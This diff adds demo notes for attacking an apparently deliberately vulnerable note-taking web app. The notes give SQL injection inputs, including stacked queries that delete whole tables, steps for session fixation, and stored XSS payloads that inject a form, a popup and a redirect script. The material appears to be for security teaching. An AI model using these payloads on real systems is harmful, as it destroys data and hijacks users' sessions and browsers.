@@ -1,0 +1,19 @@
+sql injection 1:
+- to trigger exception/stack trace input : ; 
+- get the table name etc SELECT id, title, body FROM note n where n.id = ;
+- find all : 1 or true
+- insert : 1;insert into note (title, body) values ('sql injection', 'data inserted using sql injection')
+- delete : 1;delete from note
+- delete fk : 1;delete from NOTE_TAGS
+- delete : 1;delete from note
+
+session fixation:
+- get new session id in chrome via session.jsp
+- open url in firefox
+- input data in firefox
+- refresh page in chrome
+
+xss via sql injection:
+- html inject : 1;insert into note (title, body) values ('html injection','<form action="https://www.google.com"><input type="text" name="q" /><input type="submit"></form>')
+- pop up : 1;insert into note (title, body) values ('xss popup', '<script>alert("xss")</script>')
+- redirect : 1;insert into note (title, body) values ('xss redirect', '<script>window.location.href="https://www.blibli.com"</script>')
